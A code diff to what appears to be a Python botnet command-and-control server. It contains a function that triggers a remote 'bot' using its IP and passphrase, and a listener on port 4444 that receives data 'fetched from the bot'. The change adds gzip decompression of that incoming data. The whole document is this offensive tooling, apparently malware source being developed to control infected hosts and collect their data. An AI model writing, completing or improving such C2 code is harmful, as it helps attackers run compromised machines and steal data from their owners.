@@ -2,8 +2,8 @@
 
 from flask import Flask, request
 import socket
-import threading
 import json
+import gzip
 
 app = Flask(__name__)
 
@@ -18,7 +18,7 @@ def listner(system_ip, system_port):
     listner.listen(0)                                                    
     connection, address = listner.accept()                        
     recieved_data = connection.recv(1024 * 1000000)
-    return recieved_data.decode('utf8')
+    return recieved_data
 
 def trigger(bot_ip, bot_passphrase):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -37,7 +37,7 @@ def test():
         try:
             trigger(bot_ip, bot_passphrase)
             print("[*] Bot has been triggered")
-            data = listner(system_ip, 4444)
+            data = gzip.decompress(listner(system_ip, 4444)).decode('utf8')
             print("Data fetched from the bot: ")
             print(data)
         except:
